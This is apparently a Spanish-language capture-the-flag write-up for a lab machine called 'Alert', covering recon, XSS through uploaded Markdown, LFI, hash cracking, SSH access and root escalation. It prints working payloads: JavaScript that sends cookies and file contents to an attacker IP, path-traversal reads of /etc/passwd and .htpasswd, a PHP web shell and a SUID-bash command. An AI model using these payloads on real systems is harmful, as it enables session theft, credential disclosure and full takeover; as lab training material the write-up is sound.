Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script **whichSystem.py** podremos conocer dicha información.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323140842.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.11.44`.
### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.11.44 -oG allPorts
```

Observamos como nos reporta que tan solo se encuentran abiertos los puertos **22 y 80**.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323140805.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,80 -sCV 10.10.11.44 -oN targeted
```

En el segundo escaneo de **Nmap**, lo único que nos llamará la atención es el dominio **alert.htb**.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323141107.png>)

___
### Puerto 80 - HTTP (Apache)

Para acceder a la página web, debemos añadir la siguiente línea `10.10.11.44 alert.htb` al archivo `/etc/hosts`. Una vez editado, podremos ver el contenido de la página, donde notaremos que es posible subir archivos **Markdown** para posteriormente, visualizarlos.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323141146.png>)

En la sección **About Us**, se indica que el usuario administrador revisa los mensajes enviados a través de **Contact Us**.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323141241.png>)

En este punto, montaremos un servidor con Python (`python3 -m http.server 80`) y verificaremos si el usuario administrador realmente revisa los mensajes. Para ello, enviaremos un mensaje con la siguiente estructura.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323141326.png>)

Tal como vemos a continuación, nos llegará una petición desde la máquina víctima, por lo que comprobamos que el usuario administrador está revisando los mensajes enviados en **Contact Us**.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323141352.png>)

En este punto, lo que haremos será crear un archivo llamado `pwned.md` con el siguiente contenido.

```md
<h1>Testing</h1>
```

Subiremos dicho archivo (`pwned.md`) a la web y veremos que interpreta el código **HTML**. Además, aparecerá un enlace para compartir el archivo.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323141518.png>)

Cambiaremos el contenido de `pwned.md` por el siguiente.

```md
<script>alert("Se está ejecutando javascript")</script>
```

Al subir el archivo, veremos que interpreta el código **JavaScript**, por lo que es vulnerable a un ataque **XSS**.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323141644.png>)

Actualizaremos el contenido de `pwned.md` con el siguiente código para comprobar si es capaz de realizar una petición a un recurso externo.

```md
<script src="http://10.10.16.51/pwned.js"></script>
```

Al subir el archivo `pwned.md`, se generará un enlace, el cual enviaremos al usuario administrador a través de la sección **Contact Us**.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323141840.png>)

Tras habernos montado previamente un servidor con Python (`python3 -m http.server 80`), veremos cómo recibimos una petición al recurso `pwned.js`.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323141857.png>)

Una vez que hemos comprobado que el usuario administrador es capaz de acceder a recursos externos (`pwned.js`), actualizaremos el contenido del recurso interno con el siguiente código para intentar un **Cookie Hijacking**.

```js
let req = new XMLHttpRequest();
req.open("GET", "http://10.10.16.51/?cookie="+document.cookie)
req.send()
```

Volveremos a enviar el mismo enlace al usuario administrador y veremos cómo no podemos secuestrar su cookie, ya que no se están utilizando.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323191929.png>)

En este punto, como nos hemos quedado sin opciones, realizaremos un escaneo haciendo uso de **Gobuster** de la siguiente forma.

```bash
gobuster dir -u http://alert.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 100
```

Entre todos los ficheros `.php` que nos descubre, nos llamará la atención el `messages.php`.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323192045.png>)

Accederemos a `messages.php` utilizando el parámetro que se pasa por **GET**, es decir, `?page=messages`, pero veremos que la página vacía. Pensaremos que solo el usuario administrador tiene permiso para verla.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323192116.png>)

___
## Explotación
### XSS → LFI

A partir del **XSS** que hemos encontrado, modificaremos el contenido de `pwned.js` para poder leer el contenido de `messages.php`.

```js
let req = new XMLHttpRequest();
req.onload=function(){let img = new Image(); img.src="http://10.10.16.51/?content="+btoa(this.responseText)}
req.open("GET", "http://alert.htb/index.php?page=messages")
req.send()
```

Tal y como vemos a continuación, nos llegará una petición de nuestra **Dirección IP** con menos contenido que la de **Dirección IP** de la máquina víctima.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323192638.png>)

Decodificaremos el contenido recibido en nuestra petición (`echo -n '<base64-content>' | base64 -d | cat -l html`), pero no veremos nada diferente a lo que ya veíamos en la página web.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323192656.png>)

A continuación, decodificaremos el contenido recibido en la petición de la **Dirección IP** de la máquina víctima, y veremos un hipervínculo el cual se encarga de acceder a un archivo de la máquina víctima mediante el parámetro `file`.


![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323192559.png>)

Modificaremos nuestro archivo `pwned.js` para poder visualizar el contenido de la siguiente página, `http://alert.htb/messages.php?file=../../../../etc/passwd`.

```js
let req = new XMLHttpRequest();
req.onload=function(){let img = new Image(); img.src="http://10.10.16.51/?content="+btoa(this.responseText)}
req.open("GET", "http://alert.htb/messages.php?file=../../../../etc/passwd")
req.send()
```

Tras enviar el enlace al usuario administrador, veremos que efectivamente se produce un **LFI** , lo que nos permitirá ver el contenido de `/etc/passwd` de la máquina víctima.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323193003.png>)

>[!INFO]
>En este punto, podríamos intentar leer las claves `id_rsa` de los usuarios **albert** y **david**, pero lo intentaríamos sin éxito.

Como recordamos, se estaba usando **apache2** como servidor **HTTP**, por lo que intentaremos leer su archivo de configuración (`/etc/apache2/sites-available/000-default.conf`). 

Como podemos ver, encontraremos un subdominio (`statistics.alert.htb`), en el cual se está utilizando una autenticación de tipo **Basic**.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323193308.png>)

Añadiremos este nuevo subdominio al archivo `/etc/hosts`, y al acceder a él veremos que nos solicita unas credenciales para poder ingresar.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323193343.png>)

En este punto, intentaremos leer el contenido del archivo `/var/www/statistics.alert.htb/.htpasswd`, ya que en él suele encontrarse un **nombre de usuario** y **contraseña**.

Al leer el contenido de dicho fichero, veremos que un nombre de usuario (**albert**) y un hash.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323193435.png>)
### Cracking Hash

Haciendo uso de **hashcat**, crackearemos el hash gracias al siguiente comando.

```bash
hashcat hash /usr/share/wordlists/rockyou.txt --user
```

Veremos que nos encuentra una contraseña, **manchesterunited**.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323193556.png>)

Intentaremos logearnos en dicho panel con las credenciales encontradas (**albert:manchesterunited**).

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323193622.png>)

"Conseguiremos acceder correctamente al panel, donde veremos un montón de correos electrónicos.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323193644.png>)

Como recordamos, el puerto **22** (**ssh**) estaba abierto. Además, al leer el contenido de `/etc/passwd`, vimos que existía un usuario llamado **albert**, por lo que intentaremos conectarnos a través de **ssh** de la siguiente forma.

```bash
ssh albert@10.10.11.44 # Password: manchesterunited
```

Nos conectaremos correctamente por lo que habremos ganado acceso a la máquina víctima, además cambiaremos nuestra variable de entorno **TERM** (`export TERM=xterm`) para poder limpiar la pantalla, es decir poder hacer un <kbd>CTRL</kbd>+<kbd>L</kbd>.

___
## Escalada de privilegios
### Enumeración local

Una vez hemos ganado acceso a la máquina víctima, listaremos nuestros permisos de **Sudoers**, pero veremos que no tenemos ninguno.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323193812.png>)

También, listaremos los permisos **SUID**, pero tampoco encontraremos nada interesante.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323193827.png>)

Si miramos los grupos a los que pertenecemos, nos llamará la atención el grupo **management**, ya que es algo inusual.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323193904.png>)

Buscaremos archivos que tengan como propietario al grupo **management** y encontraremos un directorio ubicado en `/opt/website-monitor/config`.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323193948.png>)

Si examinamos los procesos en ejecución y filtramos por el nombre del directorio (`ps -aux | grep website-monitor`), veremos que la aplicación ubicada en `/opt/website-monitor` está desplegada en el puerto **8080** por el usuario **root**.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323194126.png>)

Si revisamos los puertos abiertos en la máquina víctima (`netstat -ntlp`), podemos confirmar que el puerto **8080**, perteneciente a `/opt/website-monitor`, está abierto internamente.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323194159.png>)

Para poder ver el contenido de la página web, realizaremos un **Local Port Forwarding** utilizando **ssh**. Para ello, debemos conectarnos a la máquina víctima con el siguiente comando.

```bash
ssh albert@alert.htb -L 8080:localhost:8080
```

Al acceder a nuestro `localhost:8080`, veremos el contenido alojado en el puerto **8080** de la máquina víctima.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323194316.png>)
### Abuso de grupos especiales (management)

Si revisamos los permisos que tenemos sobre las carpetas de `/opt/website-monitor`, veremos que tenemos capacidad de escritura sobre la carpeta `/config` y `/monitors`.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323194437.png>)

En este punto, lo que haremos será crear un archivo **.php** en alguna de estas dos carpetas. Para ello, utilizaremos el siguiente comando.

```bash
echo '<?php system($_GET["cmd"]); ?>' > cmd.php
```

Posteriormente, accederemos a dicho archivo a través de la página web y veremos que tenemos ejecución remota de comandos (**RCE**) como el usuario **root**.

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323194559.png>)

Para elevar nuestros privilegios asignaremos permiso **SUID** a la **/bin/bash**. Para ello, debemos de ejecutar lo siguiente: `chmod u+s /bin/bash`. 

>En el caso de que el anterior comando nos de un error, ejecutaremos un `chmod 4777 /bin/bash`.
{: .prompt-tip }

Finalmente, nos ejecutaremos una **bash privilegiada** con `bash -p`, por lo que nos habremos convertido en **root** de forma efectiva (**efective user**).

![](<../assets/images/posts/2025-03-25-alert/Pasted image 20250323194834.png>)

> Alternativamente podíamos habernos mandado una **Reverse Shell** o introducir nuestra clave pública en `/root/.ssh/authorized_keys`
{: .prompt-info }